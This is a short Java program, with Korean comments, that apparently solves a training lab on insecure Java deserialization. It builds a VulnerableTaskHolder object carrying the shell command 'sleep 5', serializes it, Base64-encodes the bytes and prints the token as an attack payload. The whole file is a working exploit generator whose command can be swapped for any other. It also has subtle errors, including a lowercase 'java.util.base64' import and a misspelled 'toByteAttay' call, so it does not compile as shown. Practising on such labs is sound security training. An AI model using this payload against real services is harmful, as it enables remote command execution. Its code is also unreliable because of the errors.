import java.io.*;
import java.util.base64;
import org.dummy.insecure.framework.VulnerableTaskHolder; //import VulnerableTaskHolder

public class Attack {
    public static void main(String args[]) throws Exception {
        VulnerableTaskHolder vth = new VulnerableTaskHolder("attack", "sleep 5"); //지금 나는 맥터미널로 하고 있으니까..!
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos); //직렬화를 하는 객체!

        oos.writeObject(vth); //baos에 bytecode 형태의 vth를 저장.

        oos.flush();
        byte[] byteData = baos.toByteAttay();

        String base64Token = Base64.getEncoder().encodeToString(byteData);

        System.out.println("Result: " + base64Token);
    }
}